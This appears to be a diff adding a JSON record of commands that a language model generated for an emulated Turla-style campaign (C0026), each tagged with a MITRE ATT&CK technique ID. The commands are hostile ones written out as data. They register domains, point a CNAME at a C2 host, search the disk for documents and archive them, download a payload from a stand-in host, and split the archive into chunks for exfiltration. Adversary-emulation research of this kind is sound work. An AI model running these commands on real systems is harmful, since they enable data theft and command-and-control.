@@ -1,0 +1,82 @@
+{
+  "campaign_id": "C0026",
+  "model": "gpt-oss:20b",
+  "sample": 3,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-register-domain",
+      "command": "curl -X POST https://api.clouddns.com/v1/domains -H \\\"Authorization: Bearer FAKE_API_KEY\\\" -d '{\"name\":\"turla-test.com\",\"type\":\"A\",\"ttl\":300,\"records\":[{\"ip\":\"192.0.2.1\"}]}'",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "turla-test.com",
+        "api_endpoint": "https://api.clouddns.com/v1/domains",
+        "api_key": "FAKE_API_KEY"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "file-search",
+      "command": "find / -type f \\( -name '*.docx' -o -name '*.pdf' \\) > /tmp/doc_files.txt",
+      "target": "target.primary",
+      "parameters": {
+        "search_path": "/",
+        "extensions": [
+          ".docx",
+          ".pdf"
+        ],
+        "output_file": "/tmp/doc_files.txt"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "zip-archive",
+      "command": "powershell.exe -Command 'Get-ChildItem -Path \\\"C:\\\\Users\\\\*\\\\Documents\\\" -Recurse -Include *.docx,*.pdf | Where-Object {$_.LastWriteTime -gt \\\"2021-01-01\\\"} | Compress-Archive -DestinationPath \\\"C:\\\\archive.zip\\\"'",
+      "target": "target.primary",
+      "parameters": {
+        "file_pattern": "*.{docx,pdf}",
+        "output_archive": "C:\\\\archive.zip",
+        "modified_after": "2021-01-01"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "curl-download",
+      "command": "curl -o /tmp/payload.exe http://public_service.local/payload.bin",
+      "target": "target.primary",
+      "parameters": {
+        "download_url": "http://public_service.local/payload.bin",
+        "output_path": "/tmp/payload.exe"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "dns-update-subdomain",
+      "command": "curl -X POST https://api.clouddns.com/v1/domains/turla-test.com/subdomains -H \\\"Authorization: Bearer FAKE_API_KEY\\\" -d '{\"name\":\"turla-dyn\",\"type\":\"CNAME\",\"ttl\":300,\"target\":\"c2server.turla.org\"}'",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "turla-test.com",
+        "subdomain": "turla-dyn",
+        "record_type": "CNAME",
+        "ttl": 300,
+        "target_host": "c2server.turla.org"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "split-file",
+      "command": "split -b 3145728 /tmp/archive.zip /tmp/archive_part_",
+      "target": "boundary.no_live_exploit",
+      "parameters": {
+        "input_file": "/tmp/archive.zip",
+        "part_size_bytes": 3145728,
+        "output_prefix": "/tmp/archive_part_"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "bd7c6552d079dd7e11b73ccbf09036f6bf1fa434554a7300bc4df0f637f97683"
+}
